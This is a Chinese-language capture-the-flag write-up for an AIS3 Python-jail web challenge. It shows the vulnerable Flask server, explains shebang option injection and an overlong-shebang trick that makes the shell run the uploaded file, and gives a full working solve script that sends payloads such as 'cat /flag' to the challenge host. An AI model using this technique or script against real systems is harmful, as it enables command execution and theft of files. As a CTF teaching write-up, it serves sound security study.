題目網址：

```text
http://chals1.ais3.org:10001/
```


首頁直接給 source：

```python
#flag is at /flag

from flask import Flask,request,send_file
import os,time,uuid,unicodedata

app = Flask(__name__)

shebang = '#!/usr/local/bin/python3'

@app.route('/')
def index(): return send_file(__file__)

@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#")
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r
```


---


## 題目分析

這題雖然看起來像 pyjail，但第一眼最值得注意的其實不是 blacklist，而是這兩行：

```python
open(f"data/{uid}","w").write(shebang + d)
os.popen(f"./data/{uid} > ./output/{uid}")
```


也就是說 server 會把我們送進去的內容 `d` 直接接在：

```text
#!/usr/local/bin/python3
```


後面，然後把整份檔案當 executable 跑掉。

所以這題真正的思路不是「怎麼在受限 Python 裡面湊 payload」，而是：

**我們能不能先從 shebang 這層下手。**

---


## 先看 blacklist

題目只擋了：

```text
()_[]{}.@#
```


這個 blacklist 確實很煩，因為：

- `open('/flag').read()` 不行
- `__import__` 不行
- 一堆常見 pyjail object chain 也不行

但這題有一個跟後面 `10002` 最大的差別：

> **這題沒有第一行長度限制。**

這點非常重要。

---


## 第一個觀察：shebang option injection

假設我們送：

```text
 -V
```


那 server 寫出去的檔案開頭會變成：

```text
#!/usr/local/bin/python3 -V
```


這等價於讓系統執行：

```bash
python3 -V ./data/<uid>
```


所以 shebang 後面這段，我們其實可以控制 Python 啟動參數。

例如：

- ` -V`
- ` -h`
- ` -mthis`

都屬於同一類利用方式。

不過這題真正的重點不只是 option injection，而是更後面的 shell fallback。

---


## 第二個觀察：把第一行撐很長

這題沒有 `len(d.split("\n")[0]) < 50` 之類的限制，所以我們可以直接把第一行塞很長。

例如：

```python
b"A" * 300 + b"\necho OK\n"
```


實際寫出去的檔案會長得像：

```text
#!/usr/local/bin/python3AAAAAAAAAAAA....AAAA
echo OK
```


也就是一條超長而且不正常的 shebang。

這種情況下，執行 `./data/<uid>` 時，kernel 不會乖乖用正常的 Python interpreter path 來跑它。接著因為程式是透過：

```python
os.popen(...)
```


啟動的，底層其實是 shell 在執行命令。當這個檔案沒辦法被正常當成 shebang script 執行時，shell 會退回去把它當成一般 shell script 解讀。

這就是這題的核心。

也就是說：

- 第一行故意做壞 shebang
- 第二行開始改寫成 shell 指令

這樣整份檔案最後就不是被 Python 跑，而是被 shell 跑。

---


## 所以 payload 可以直接變成 shell script

既然會 fallback 到 shell，那最直接的第二行就是：

```sh
cat /flag
```


也就是：

```python
b"A" * 300 + b"\ncat /flag\n"
```


概念上這樣就夠了。

但是實作上還有一個更穩的版本。

因為 server 本來就會把標準輸出重新導到：

```text
./output/<uid>
```


所以如果想避免 shell / pipe / buffering 類的小問題，最乾脆就是直接在 payload 裡把 flag 寫進對應 output 檔案：

```sh
cat /flag > output/<uid>
```


這樣 server 後面讀：

```python
open(f"output/{uid}","r").read()
```


就一定會拿到我們剛剛寫進去的內容。

---


## 解法整理

整條 exploit chain 可以整理成：

1. 利用 shebang 拼接點，控制整個檔案第一行
2. 因為這題沒有長度限制，所以把第一行撐到很長，故意讓 shebang 失效
3. `os.popen()` 透過 shell 執行這個檔案時，會 fallback 把它當 shell script 解讀
4. 第二行直接寫 shell 指令 `cat /flag`
5. 更穩一點可以直接 `cat /flag > output/<uid>`
6. server 最後讀 `output/<uid>`，自然就把 flag 回給我們

所以這題的本質其實不是 Python sandbox escape，而比較像：

**利用 shebang 壞掉之後的 shell fallback，把 Python 題打成 shell script 題。**

## `solve_pyjail_1.py`

我用的腳本會先做幾個基本測試確認行為：

- `python -V`
- `python -h`
- `python -mthis`
- 一般 Python 檔

接著送幾組 shell fallback payload：

- `echo OK`
- `cat /flag`
- `cat /flag > output/<uid>`

關鍵部分如下：

```python
("shell fallback echo", b"A" * 300 + b"\necho OK\n"),
("shell fallback cat flag", b"A" * 300 + b"\ncat /flag\n"),
```


以及最後最穩的 direct write：

```python
uid = str(uuid.uuid4())
body = (b"A" * 300) + f"\ncat /flag > output/{uid}\n".encode()
```


這樣就可以直接把 `/flag` 寫到 server 之後會讀取的地方。

---


## 完整 solve script

```python
#!/usr/bin/env python3
import http.client
import uuid

HOST = "chals1.ais3.org"
PORT = 10001
TIMEOUT = 10

def post_raw(body: bytes):
    uid = str(uuid.uuid4())
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
    conn.request(
        "POST",
        f"/{uid}",
        body=body,
        headers={"Content-Type": "application/octet-stream"},
    )
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return uid, resp.status, data

def show(name: str, body: bytes):
    uid, status, data = post_raw(body)
    print("=" * 80)
    print(name)
    print("uid   :", uid)
    print("code  :", status)
    print("body  :", repr(data))
    try:
        print(data.decode("utf-8", errors="replace"))
    except Exception:
        pass

tests = [
    ("python -V", b" -V"),
    ("python -h", b" -h"),
    ("python -mthis", b" -mthis"),
    ("normal python file", b"\nimport this\n"),
    ("shell fallback echo", b"A" * 300 + b"\necho OK\n"),
    ("shell fallback cat flag", b"A" * 300 + b"\ncat /flag\n"),
]

for name, body in tests:
    show(name, body)

uid = str(uuid.uuid4())
body = (b"A" * 300) + f"\ncat /flag > output/{uid}\n".encode()
conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT)
conn.request(
    "POST",
    f"/{uid}",
    body=body,
    headers={"Content-Type": "application/octet-stream"},
)
resp = conn.getresponse()
data = resp.read()
conn.close()

print("=" * 80)
print("shell fallback direct write")
print("uid   :", uid)
print("code  :", resp.status)
print("body  :", repr(data))
try:
    print(data.decode("utf-8", errors="replace"))
except Exception:
    pass
```

## 小結

這題最關鍵的 insight 只有一句：

> 不是去想怎麼在 Python 裡逃，而是先把 shebang 弄壞，讓整份檔案改由 shell 解讀。

和 `10002` 比起來，`10001` 好解非常多，差別就在於：

- `10001` 沒有限制第一行長度
- 所以可以直接用超長第一行去做 shell fallback
- 第二行開始就能寫最樸素的 shell 指令

這題本質上是：

**shebang injection + shell fallback + 直接 `cat /flag`**
